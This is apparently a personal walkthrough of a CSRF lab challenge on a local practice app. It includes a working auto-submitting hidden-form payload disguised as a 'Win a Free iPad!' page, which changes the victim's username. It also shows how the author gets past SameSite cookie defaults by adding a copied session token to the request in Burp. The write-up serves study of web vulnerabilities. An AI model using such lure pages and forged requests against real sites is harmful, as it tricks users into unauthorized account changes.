- First, let's see what requests are made when changing username
- Go to http://localhost:3000/profile and change user name
- See in burp HTTP history
```
POST /profile HTTP/1.1
[...]
username=Jim
```
- Create an HTML form that automatically submit
```
<!DOCTYPE html>
<html>
<head>
    <title>Win a Free iPad!</title>
</head>
<body>
    <h1>Congratulations! You've won!</h1>
    <p>Please wait while we redirect you to your prize...</p>

    <!-- The Malicious Hidden Form -->
    <form id="csrfForm" action="http://localhost:3000/profile" method="POST">
        <input type="hidden" name="username" value="Hehe" />
    </form>

    <script>
        // The moment the page loads, JavaScript automatically submits the form
        window.onload = function() {
            document.getElementById('csrfForm').submit();
        };
    </script>
</body>
</html>
```
- See `Error: Blocked illegal activity by ::ffff:172.17.0.1`
- It seems that because I use Brave, which is a modern browser that default cookies setting to `SameSite=Lax` (SameSite Cookie Defaults)
- The reason is that while the Same-Origin Policy stops Tab 1 from _reading_ Tab 2's data, historically it did **not** stop Tab 1 from _sending a message_ to Tab 2's server.
- `SameSite` doesn't change tab isolation at all. Instead, it changes **how the browser handles cookies when a request crosses from one site to another**
- I don't want to download an old browser so let's cheat this
- Open burpsuite
- `cmd + shift + I`
- Go to Application -> Click and view cookies
- Copy the value of `token`
- Go to http://htmledit.squarefree.com/ (note: `https` does not work, `http` works)
- Turn burp intercept on
- Paste the code
- See the intercepted Request in burp
- Add `Cookie: token=[the token I copied earlier]` to the POST request
- Click forward
- Complete the challenge